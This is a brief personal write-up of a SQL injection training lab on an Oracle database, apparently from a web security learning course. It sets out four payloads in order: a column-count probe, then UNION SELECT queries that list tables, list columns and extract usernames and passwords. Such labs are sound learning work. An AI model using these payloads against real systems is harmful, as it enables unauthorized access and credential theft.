# Seventh Lab : SQL Injection

Lab - 07 : SQL injection attack, listing the database contents on Oracle

SQL Injection : product category filter

Endgoal : Logging in as administrator

Analysis : 

1. SQl injection issues using ‘ → True
2. To output data from the database.
    1. Determine the number of columns
        
        ```
        Payload -> ' order by 1--
        ```
        
        ![vmplayer_TsMfQz09s3.png](Seventh%20Lab%20SQL%20Injection%2021a3c5d54c768020aff3e61a591abba7/vmplayer_TsMfQz09s3.png)
        
    2. To list the contents of the database 
        
        ```
        Payload -> ' UNION SELECT table_name, NULL FROM all_tables--
        ```
        
    3. To list the column names of the table 
        
        ```
        Payload -> ' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name='USERS_NNDQUD'--
        ```
        
    4. To list the usernames and passwords of the table, now that we know the name of the columns
        
        ```
        Payload -> ' UNION SELECT USERNAME_YNPHMM, PASSWORD_HLBXKQ FROM USERS_NNDQUD--
        ```
        
        ![vmplayer_GSclatC4rz.png](Seventh%20Lab%20SQL%20Injection%2021a3c5d54c768020aff3e61a591abba7/vmplayer_GSclatC4rz.png)
        
        dAMNNN, done with it